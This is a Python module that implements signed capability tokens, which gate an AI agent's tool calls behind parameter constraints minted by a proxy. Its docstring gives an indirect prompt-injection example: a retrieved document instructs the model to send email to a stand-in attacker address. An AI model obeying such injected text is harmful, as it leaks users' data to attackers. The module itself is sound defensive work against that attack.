"""Dual-Channel Capability Tokens.

Tool execution is gated on cryptographically-signed capability tokens that the
*proxy* (not the model) mints. A model can request a tool call, but unless a
capability token was minted out-of-band (via SDK or inferred from L2 user
intent), the call fails at the Capability Gate.

This is what defeats indirect prompt injection: a malicious retrieved document
that says "send_email(to=attacker@evil.com)" cannot succeed because no token
binding `send_email` to that recipient was ever minted.
"""

from __future__ import annotations

import base64
import contextlib
import enum
import hmac
import json
import re
import secrets
import time
from dataclasses import dataclass, field
from hashlib import sha256
from typing import Any

CAPABILITY_VERSION = "v1"


class ConstraintKind(str, enum.Enum):
    EQUALS = "eq"
    IN_SET = "in"
    REGEX = "re"
    ANY = "any"
    PREFIX = "prefix"
    MAX_LEN = "max_len"


@dataclass
class ParamConstraint:
    """Constraint over a single parameter value."""

    kind: ConstraintKind
    value: Any = None

    def to_dict(self) -> dict[str, Any]:
        return {"kind": self.kind.value, "value": self.value}

    @classmethod
    def from_dict(cls, d: dict[str, Any]) -> ParamConstraint:
        return cls(kind=ConstraintKind(d["kind"]), value=d.get("value"))

    def check(self, actual: Any) -> bool:
        if self.kind == ConstraintKind.ANY:
            return True
        if self.kind == ConstraintKind.EQUALS:
            return actual == self.value
        if self.kind == ConstraintKind.IN_SET:
            try:
                return actual in self.value  # type: ignore[operator]
            except TypeError:
                return False
        if self.kind == ConstraintKind.REGEX:
            if not isinstance(actual, str):
                return False
            try:
                return re.fullmatch(str(self.value), actual) is not None
            except re.error:
                return False
        if self.kind == ConstraintKind.PREFIX:
            return isinstance(actual, str) and actual.startswith(str(self.value))
        if self.kind == ConstraintKind.MAX_LEN:
            try:
                return len(actual) <= int(self.value)  # type: ignore[arg-type]
            except (TypeError, ValueError):
                return False
        return False


@dataclass
class CapabilityClaims:
    tool: str
    session_id: str
    nonce: str
    issued_at: float
    expires_at: float
    constraints: dict[str, ParamConstraint] = field(default_factory=dict)
    metadata: dict[str, Any] = field(default_factory=dict)
    single_use: bool = True
    v: str = CAPABILITY_VERSION

    def to_dict(self) -> dict[str, Any]:
        return {
            "v": self.v,
            "tool": self.tool,
            "sid": self.session_id,
            "nonce": self.nonce,
            "iat": int(self.issued_at),
            "exp": int(self.expires_at),
            "single_use": self.single_use,
            "constraints": {k: v.to_dict() for k, v in self.constraints.items()},
            "metadata": self.metadata,
        }

    @classmethod
    def from_dict(cls, d: dict[str, Any]) -> CapabilityClaims:
        return cls(
            v=d.get("v", CAPABILITY_VERSION),
            tool=d["tool"],
            session_id=d["sid"],
            nonce=d["nonce"],
            issued_at=float(d["iat"]),
            expires_at=float(d["exp"]),
            single_use=bool(d.get("single_use", True)),
            constraints={k: ParamConstraint.from_dict(v) for k, v in (d.get("constraints") or {}).items()},
            metadata=d.get("metadata", {}),
        )


@dataclass
class CapabilityToken:
    """A serializable capability — opaque to consumers, verified by the Minter."""

    raw: str
    claims: CapabilityClaims

    @property
    def expired(self) -> bool:
        return time.time() > self.claims.expires_at


@dataclass
class ProposedCall:
    tool: str
    parameters: dict[str, Any]


@dataclass
class CapabilityVerdict:
    valid: bool
    reason: str
    token: CapabilityToken | None = None
    failed_constraints: tuple[str, ...] = field(default_factory=tuple)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _sign(claims: CapabilityClaims, key: bytes) -> str:
    body = json.dumps(claims.to_dict(), sort_keys=True, separators=(",", ":")).encode("utf-8")
    body_b64 = _b64url_encode(body)
    sig = hmac.new(key, body_b64.encode("ascii"), sha256).digest()
    sig_b64 = _b64url_encode(sig)
    return f"aegis_cap.{CAPABILITY_VERSION}.{body_b64}.{sig_b64}"


def _parse(raw: str) -> tuple[CapabilityClaims, str, str]:
    parts = raw.split(".")
    if len(parts) != 4 or parts[0] != "aegis_cap" or parts[1] != CAPABILITY_VERSION:
        raise ValueError("malformed capability token")
    body_b64, sig_b64 = parts[2], parts[3]
    claims = CapabilityClaims.from_dict(json.loads(_b64url_decode(body_b64)))
    return claims, body_b64, sig_b64


class CapabilityMinter:
    """Mints and validates capability tokens.

    Tokens bind:
        - tool name
        - parameter constraints (per-parameter ParamConstraint)
        - session id
        - issued_at / expires_at
        - single-use nonce

    Single-use enforcement is in-memory; for distributed deployments swap in
    a Redis-backed nonce store via `set_used_callback`.
    """

    def __init__(self, default_ttl_seconds: int = 600) -> None:
        self.default_ttl = default_ttl_seconds
        self._used: set[str] = set()
        self._used_callback = None  # type: ignore[var-annotated]

    def set_used_callback(self, cb) -> None:
        self._used_callback = cb

    def mint(
        self,
        tool: str,
        session_id: str,
        session_key: bytes,
        constraints: dict[str, ParamConstraint] | None = None,
        ttl_seconds: int | None = None,
        single_use: bool = True,
        metadata: dict[str, Any] | None = None,
    ) -> CapabilityToken:
        now = time.time()
        ttl = ttl_seconds if ttl_seconds is not None else self.default_ttl
        claims = CapabilityClaims(
            tool=tool,
            session_id=session_id,
            nonce=secrets.token_urlsafe(16),
            issued_at=now,
            expires_at=now + ttl,
            constraints=constraints or {},
            metadata=metadata or {},
            single_use=single_use,
        )
        raw = _sign(claims, session_key)
        return CapabilityToken(raw=raw, claims=claims)

    def parse(self, raw: str) -> CapabilityClaims:
        claims, _, _ = _parse(raw)
        return claims

    def verify(
        self,
        raw: str,
        session_key: bytes,
        proposed: ProposedCall,
        expected_session_id: str | None = None,
    ) -> CapabilityVerdict:
        try:
            claims, body_b64, sig_b64 = _parse(raw)
        except (ValueError, json.JSONDecodeError) as exc:
            return CapabilityVerdict(valid=False, reason=f"malformed: {exc}")

        expected_sig = hmac.new(session_key, body_b64.encode("ascii"), sha256).digest()
        if not hmac.compare_digest(_b64url_encode(expected_sig), sig_b64):
            return CapabilityVerdict(valid=False, reason="signature mismatch")

        if expected_session_id is not None and claims.session_id != expected_session_id:
            return CapabilityVerdict(valid=False, reason="session_id mismatch")

        if time.time() > claims.expires_at:
            return CapabilityVerdict(valid=False, reason="expired")

        if claims.tool != proposed.tool:
            return CapabilityVerdict(valid=False, reason=f"tool mismatch: token={claims.tool} call={proposed.tool}")

        failed: list[str] = []
        for param_name, constraint in claims.constraints.items():
            if param_name not in proposed.parameters:
                failed.append(f"{param_name}:missing")
                continue
            if not constraint.check(proposed.parameters[param_name]):
                failed.append(f"{param_name}:violates_{constraint.kind.value}")

        if failed:
            return CapabilityVerdict(
                valid=False,
                reason="parameter constraints failed",
                failed_constraints=tuple(failed),
            )

        if claims.single_use and claims.nonce in self._used:
            return CapabilityVerdict(valid=False, reason="single-use token already consumed")

        token = CapabilityToken(raw=raw, claims=claims)
        return CapabilityVerdict(valid=True, reason="ok", token=token)

    def consume(self, token: CapabilityToken) -> None:
        if not token.claims.single_use:
            return
        self._used.add(token.claims.nonce)
        if self._used_callback is not None:
            with contextlib.suppress(Exception):
                self._used_callback(token.claims.nonce)


def constraint_eq(value: Any) -> ParamConstraint:
    return ParamConstraint(kind=ConstraintKind.EQUALS, value=value)


def constraint_in(values: list[Any]) -> ParamConstraint:
    return ParamConstraint(kind=ConstraintKind.IN_SET, value=list(values))


def constraint_regex(pattern: str) -> ParamConstraint:
    return ParamConstraint(kind=ConstraintKind.REGEX, value=pattern)


def constraint_prefix(prefix: str) -> ParamConstraint:
    return ParamConstraint(kind=ConstraintKind.PREFIX, value=prefix)


def constraint_max_len(n: int) -> ParamConstraint:
    return ParamConstraint(kind=ConstraintKind.MAX_LEN, value=n)


def constraint_any() -> ParamConstraint:
    return ParamConstraint(kind=ConstraintKind.ANY)
